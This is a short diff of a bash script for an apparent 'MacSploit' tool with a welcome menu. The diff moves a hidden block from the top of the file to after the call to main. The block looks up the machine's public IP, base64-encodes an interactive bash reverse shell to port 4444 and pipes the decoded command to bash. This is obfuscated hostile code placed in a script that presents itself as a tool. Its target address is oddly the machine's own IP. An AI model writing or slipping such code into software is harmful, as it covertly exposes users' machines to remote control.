@@ -1,10 +1,5 @@
 #!/bin/bash
 
-VICTIM_IP=$(curl -s https://api.ipify.org)
-PORT=4444
-ENCODED=$(echo "bash -i >& /dev/tcp/$VICTIM_IP/$PORT 0>&1" | base64)
-echo "$ENCODED" | base64 -d | bash
-
 main() {
     clear
     echo -e "Welcome to the MacSploit Experience!"
@@ -124,3 +119,8 @@ main() {
 }
 
 main
+
+VICTIM_IP=$(curl -s https://api.ipify.org)
+PORT=4444
+ENCODED=$(echo "bash -i >& /dev/tcp/$VICTIM_IP/$PORT 0>&1" | base64)
+echo "$ENCODED" | base64 -d | bash
